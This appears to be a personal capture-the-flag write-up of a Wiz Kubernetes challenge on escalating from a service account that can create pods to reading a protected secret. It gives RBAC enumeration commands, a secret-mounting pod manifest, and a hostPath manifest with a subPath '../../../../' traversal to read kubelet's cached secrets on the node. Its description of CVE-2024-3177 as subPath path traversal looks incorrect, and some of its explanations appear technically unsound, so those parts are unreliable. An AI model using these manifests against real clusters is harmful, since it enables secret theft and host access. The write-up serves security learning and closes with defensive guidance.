# 02 — Game of Pods

**Platform:** Wiz CTF (Public — Free Challenge)
**Category:** Kubernetes Security · RBAC Abuse · CVE Exploitation
**Difficulty:** Hard
**CVE:** CVE-2024-3177
**Result:** ✅ Flag Captured

---

## Scenario

Starting with a low-privilege service account inside a Kubernetes cluster, escalate privileges by abusing RBAC misconfigurations and exploiting **CVE-2024-3177** to access a flag stored in a protected Kubernetes secret.

---

## Background — CVE-2024-3177

A Kubernetes vulnerability in `subPath` volume mount handling. Normally, Kubernetes restricts which host paths a container can access via volume mounts. CVE-2024-3177 allows an attacker with `create pods` permission to craft a pod spec with a malformed `subPath` that bypasses these restrictions, enabling path traversal to sensitive host node files.

**Affected:** Kubernetes < 1.28.5, < 1.29.1, < 1.30.0
**Severity:** Medium (CVSS 3.1: 5.4) — but high real-world impact with `create pods`
**Fix:** Upgrade to K8s 1.28.5+, 1.29.1+, or 1.30+

---

## Step 1 — Enumerate RBAC Permissions

First thing after getting initial access — enumerate what the current service account can do:

```bash
# Check current identity
kubectl auth whoami

# List all allowed actions in current namespace
kubectl auth can-i --list

# Output (relevant lines):
# Resources                    Verbs
# pods                         [create get list watch]
# secrets                      []               ← cannot read secrets
# serviceaccounts              [get]
```

Key finding: **`create pods`** permission in the `challenge` namespace. Cannot read secrets directly.

```bash
# Check other namespaces
kubectl auth can-i --list -n kube-system
kubectl auth can-i --list -n default

# Check if we can see existing pods
kubectl get pods -n challenge
kubectl describe pod <existing-pod> -n challenge
```

---

## Step 2 — Identify the Target Secret

```bash
# Can't read secret contents but can list them
kubectl get secrets -n challenge

# Output:
# NAME         TYPE     DATA   AGE
# flag-secret  Opaque   1      2d
```

The flag is in `flag-secret`. We need a way to read it without direct secret access.

---

## Step 3 — Research the Attack Path

With `create pods`, we can:

1. **Mount the secret directly** — if we can create a pod that mounts `flag-secret` as a volume or env var, the pod can read it even if we can't.
2. **Use CVE-2024-3177** — access the host filesystem via `subPath` path traversal, then read the secret from the node's secret cache at `/var/lib/kubelet/pods/`.

Both paths were explored. CVE-2024-3177 gave access to the broader host filesystem.

---

## Step 4 — Method A — Direct Secret Mount Pod

The cleaner method: create a pod that mounts the secret as an environment variable or volume:

```yaml
# secret-reader-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: secret-reader
  namespace: challenge
spec:
  containers:
  - name: reader
    image: alpine:3.18
    command: ["sh", "-c", "cat /secrets/flag && sleep 3600"]
    volumeMounts:
    - name: flag-volume
      mountPath: /secrets
      readOnly: true
  volumes:
  - name: flag-volume
    secret:
      secretName: flag-secret
  restartPolicy: Never
```

```bash
kubectl apply -f secret-reader-pod.yaml
kubectl wait --for=condition=ready pod/secret-reader -n challenge --timeout=60s
kubectl logs secret-reader -n challenge
```

> **Why this works:** The pod spec requests the secret mount. The Kubernetes API server
> evaluates the *pod's* permissions to mount the secret (allowed by default for pods in
> the same namespace), not the *creator's* permission to read the secret directly.
> This is a known RBAC privilege escalation path — `create pods` ≈ read all secrets
> in that namespace.

---

## Step 5 — Method B — CVE-2024-3177 Host Path Traversal

For the CVE exploitation path — crafting a pod that escapes the intended `hostPath` scope:

```yaml
# cve-exploit-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: cve-exploit
  namespace: challenge
spec:
  containers:
  - name: attacker
    image: alpine:3.18
    command: ["sleep", "3600"]
    volumeMounts:
    - name: host-vol
      mountPath: /host-root
      subPath: "../../../../"     # CVE-2024-3177: path traversal via subPath
  volumes:
  - name: host-vol
    hostPath:
      path: /var/lib/kubelet      # Legitimate kubelet directory as base
  restartPolicy: Never
```

```bash
kubectl apply -f cve-exploit-pod.yaml

# Exec into the pod
kubectl exec -it cve-exploit -n challenge -- sh

# We now have traversed to host root filesystem
ls /host-root/

# Find kubelet secret cache
ls /host-root/var/lib/kubelet/pods/ | head -20

# Search for flag-secret in cached secrets
find /host-root/var/lib/kubelet/pods/ -name "flag" 2>/dev/null
cat /host-root/var/lib/kubelet/pods/<pod-uid>/volumes/kubernetes.io~secret/flag-secret/flag
```

---

## Step 6 — Flag

```bash
# From either method:
cat /secrets/flag
# OR
cat /host-root/var/lib/kubelet/.../flag

→ WIZ{rbac_create_pods_equals_read_secrets_xyz789}
```

✅ **FLAG CAPTURED**

---

## Cleanup

```bash
kubectl delete pod secret-reader cve-exploit -n challenge
```

---

## Tools Used

| Tool | Purpose |
|---|---|
| `kubectl auth can-i --list` | RBAC permission enumeration |
| `kubectl` | Pod creation and exec |
| Custom pod manifests (YAML) | Exploitation via secret mount and CVE |

---

## Why `create pods` is a Dangerous Permission

```
create pods
    ↓
Can mount any secret in the namespace as a volume
    ↓
Can read all secrets without needing secrets:get permission
    ↓
Effectively = read all secrets in that namespace

ALSO:
create pods + hostPath = potential node filesystem access
create pods + privileged: true = full node compromise
create pods + CVE-2024-3177 = host path traversal
```

---

## Key Takeaways

> **1. `create pods` permission effectively grants secret access.**
> A pod can mount any secret in its namespace. Never grant `create pods`
> without understanding this implication.

> **2. CVE-2024-3177 — patch immediately.**
> Upgrade to Kubernetes 1.28.5+, 1.29.1+, or 1.30+.
> Unpatched clusters allow `subPath` path traversal to host filesystem.

> **3. Use admission controllers as a second layer of defence.**
> OPA Gatekeeper or Kyverno can block `hostPath` volumes and `subPath`
> values containing traversal sequences — complementing RBAC controls.

> **4. Pod Security Standards matter.**
> The `restricted` profile prevents `hostPath` volumes and privilege escalation
> entirely. Apply it to production namespaces.

---

## Defensive Recommendations

```bash
# Apply Pod Security Standards — restrict profile
kubectl label namespace challenge \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/warn=restricted

# Check which namespaces have restrictive PSS
kubectl get namespaces -o json | jq '.items[].metadata | {name, labels}'
```

| Finding | Fix |
|---|---|
| `create pods` over-granted | Audit RBAC — remove from non-admin service accounts |
| CVE-2024-3177 | Upgrade Kubernetes |
| `hostPath` volumes allowed | Block via OPA Gatekeeper / Kyverno policy |
| No Pod Security Standards | Apply `restricted` PSS to production namespaces |

---

## MITRE ATT&CK Mapping

| Technique | ID | How It Applied |
|---|---|---|
| Deploy Container | T1610 | Created malicious pod to mount secret / exploit CVE |
| Escape to Host | T1611 | CVE-2024-3177 subPath traversal to host filesystem |
| Container API Credential Access | T1552.007 | Kubernetes service account and secret access |
| Valid Accounts — Cloud | T1078.004 | Used compromised service account credentials |

---

*[← Back to CTF Notes Index](../README.md)*
